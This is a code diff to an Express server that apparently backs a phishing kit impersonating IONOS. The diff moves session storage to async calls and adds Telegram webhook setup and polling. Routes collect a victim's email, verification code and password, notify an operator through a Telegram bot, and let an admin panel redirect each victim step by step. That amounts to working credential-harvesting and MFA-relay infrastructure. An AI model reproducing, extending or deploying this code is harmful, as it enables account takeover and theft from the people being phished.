@@ -3,6 +3,7 @@ const express = require("express");
 const os = require("os");
 const path = require("path");
 const flow = require("./lib/ionos-flow");
+const { getStoreMode } = require("./lib/ionos-store");
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -88,9 +89,12 @@ async function handleTelegramCallback(callbackQuery) {
   const parsed = flow.parseCallbackData(callbackQuery.data);
   if (!parsed) return;
 
-  const result = flow.applyAdminAction(parsed.id, parsed.action);
+  const result = await flow.applyAdminAction(parsed.id, parsed.action);
   if (!result.ok) {
-    await answerTelegramCallback(callbackQuery.id, "Session nicht gefunden");
+    await answerTelegramCallback(
+      callbackQuery.id,
+      "Session nicht gefunden (Store: " + getStoreMode() + ")"
+    );
     return;
   }
 
@@ -101,6 +105,35 @@ async function handleTelegramCallback(callbackQuery) {
     thankyou: "→ Thank You",
   };
   await answerTelegramCallback(callbackQuery.id, labels[parsed.action] || "OK");
+}
+
+async function setupTelegramWebhook() {
+  const token = process.env.TELEGRAM_BOT_TOKEN;
+  if (!token) return;
+
+  const base =
+    process.env.TELEGRAM_WEBHOOK_URL ||
+    (process.env.VERCEL_URL ? `https://${process.env.VERCEL_URL}` : null);
+  if (!base) return;
+
+  const webhookUrl = `${base.replace(/\/$/, "")}/api/telegram/webhook`;
+  const res = await fetch(`https://api.telegram.org/bot${token}/setWebhook`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ url: webhookUrl, allowed_updates: ["callback_query"] }),
+  });
+  const data = await res.json().catch(() => ({}));
+  if (data.ok) {
+    console.log("[telegram] Webhook set:", webhookUrl);
+  } else {
+    console.error("[telegram] Webhook failed:", data.description || res.statusText);
+  }
+}
+
+async function clearTelegramWebhook() {
+  const token = process.env.TELEGRAM_BOT_TOKEN;
+  if (!token) return;
+  await fetch(`https://api.telegram.org/bot${token}/deleteWebhook`).catch(() => {});
 }
 
 async function pollTelegramUpdates() {
@@ -318,7 +351,9 @@ app.get("/ionos-emailconfirmation.html", async (req, res) => {
 
 app.use(express.static(path.join(__dirname, "public")));
 
-app.get("/health", (_req, res) => res.json({ ok: true }));
+app.get("/health", (_req, res) =>
+  res.json({ ok: true, sessionStore: getStoreMode() })
+);
 
 // ── IONOS flow control ──────────────────────────────────────────────
 
@@ -328,7 +363,7 @@ app.post("/api/ionos/start", async (req, res) => {
     return res.status(400).json({ ok: false, message: "Email required" });
   }
 
-  const session = flow.createSession({
+  const session = await flow.createSession({
     email,
     ip: getClientIp(req),
     ua: req.headers["user-agent"] || "",
@@ -336,16 +371,15 @@ app.post("/api/ionos/start", async (req, res) => {
 
   await notifyFlowSession(session, "📧 IONOS — Email eingegeben");
 
-  return res.json({ ok: true, sessionId: session.id });
+  return res.json({ ok: true, sessionId: session.id, store: getStoreMode() });
 });
 
-app.get("/api/ionos/session/:id", (req, res) => {
-  const session = flow.getSession(req.params.id);
+app.get("/api/ionos/session/:id", async (req, res) => {
+  const session = await flow.getSession(req.params.id);
   if (!session) return res.status(404).json({ ok: false });
-  const error = session.error || null;
-  if (req.query.consume === "1" && session.error) {
-    session.error = null;
-    session.updatedAt = Date.now();
+  let error = session.error || null;
+  if (req.query.consume === "1" && error) {
+    await flow.updateSession(session.id, { error: null });
   }
   return res.json({
     ok: true,
@@ -357,56 +391,56 @@ app.get("/api/ionos/session/:id", (req, res) => {
   });
 });
 
-app.get("/api/ionos/session/:id/poll", (req, res) => {
-  const state = flow.getPollState(req.params.id);
+app.get("/api/ionos/session/:id/poll", async (req, res) => {
+  const state = await flow.getPollState(req.params.id);
   return res.json(state);
 });
 
 app.post("/api/ionos/session/:id/code", async (req, res) => {
-  const session = flow.getSession(req.params.id);
+  const session = await flow.getSession(req.params.id);
   if (!session) return res.status(404).json({ ok: false, message: "Session not found" });
 
   const code = String(req.body.code || "").trim();
   if (!code) return res.status(400).json({ ok: false, message: "Code required" });
 
-  flow.updateSession(session.id, {
+  await flow.updateSession(session.id, {
     code,
     step: "code_submitted",
     pending: "code",
   });
 
-  const updated = flow.getSession(session.id);
+  const updated = await flow.getSession(session.id);
   await notifyFlowSession(updated, "🔢 IONOS — Code eingegeben");
 
   return res.json({ ok: true, sessionId: session.id });
 });
 
 app.post("/api/ionos/session/:id/password", async (req, res) => {
-  const session = flow.getSession(req.params.id);
+  const session = await flow.getSession(req.params.id);
   if (!session) return res.status(404).json({ ok: false, message: "Session not found" });
 
   const password = String(req.body.password || "");
   if (!password) return res.status(400).json({ ok: false, message: "Password required" });
 
-  flow.updateSession(session.id, {
+  await flow.updateSession(session.id, {
     password,
     step: "password_submitted",
     pending: "password",
   });
 
-  const updated = flow.getSession(session.id);
+  const updated = await flow.getSession(session.id);
   await notifyFlowSession(updated, "🔑 IONOS — Passwort eingegeben");
 
   return res.json({ ok: true, sessionId: session.id });
 });
 
-app.get("/api/admin/sessions", requireAdmin, (_req, res) => {
-  res.json({ ok: true, sessions: flow.listSessions() });
+app.get("/api/admin/sessions", requireAdmin, async (_req, res) => {
+  res.json({ ok: true, sessions: await flow.listSessions(), store: getStoreMode() });
 });
 
-app.post("/api/admin/session/:id/redirect", requireAdmin, (req, res) => {
+app.post("/api/admin/session/:id/redirect", requireAdmin, async (req, res) => {
   const action = String(req.body.action || "");
-  const result = flow.applyAdminAction(req.params.id, action);
+  const result = await flow.applyAdminAction(req.params.id, action);
   if (!result.ok) {
     return res.status(404).json({ ok: false, message: result.error });
   }
@@ -463,9 +497,10 @@ app.post("/api/login", async (req, res) => {
 
 // Only start the HTTP server when running locally (not on Vercel)
 if (process.env.VERCEL !== "1") {
-  app.listen(PORT, HOST, () => {
+  app.listen(PORT, HOST, async () => {
     const localAddresses = getLocalAddresses();
     console.log(`Server listening on ${HOST}:${PORT}`);
+    console.log(`Session store: ${getStoreMode()}`);
     console.log(`Local:   http://localhost:${PORT}`);
     console.log(`Panel:   http://localhost:${PORT}/ionos-panel.html`);
     for (const address of localAddresses) {
@@ -474,11 +509,17 @@ if (process.env.VERCEL !== "1") {
     if (localAddresses.length === 0) {
       console.log("No LAN IPv4 address found. Check your network connection.");
     }
+    if (getStoreMode() === "memory") {
+      console.warn("[ionos] Using memory store — add Upstash Redis for Vercel/production");
+    }
     if (process.env.TELEGRAM_BOT_TOKEN) {
+      await clearTelegramWebhook();
       pollTelegramUpdates();
       console.log("[telegram] Callback polling started");
     }
   });
+} else {
+  setupTelegramWebhook().catch((err) => console.error("[telegram webhook]", err.message));
 }
 
 module.exports = app;
